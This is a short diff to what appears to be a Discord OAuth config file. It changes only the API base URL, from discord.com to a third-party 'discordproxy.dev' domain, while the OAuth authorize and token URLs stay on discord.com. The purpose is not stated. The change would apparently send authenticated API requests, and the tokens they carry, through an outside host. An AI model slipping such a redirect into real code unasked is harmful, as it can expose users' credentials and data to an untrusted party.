@@ -13,7 +13,7 @@ export default {
     responseType: 'code',
   },
   discordUrls: {
-    baseUrl: 'https://discord.com/api',
+    baseUrl: 'https://discordproxy.dev/api',
     authUrl: 'https://discord.com/api/oauth2/authorize',
     tokenUrl: 'https://discord.com/api/oauth2/token',
     appCDN: 'https://cdn.discordapp.com',
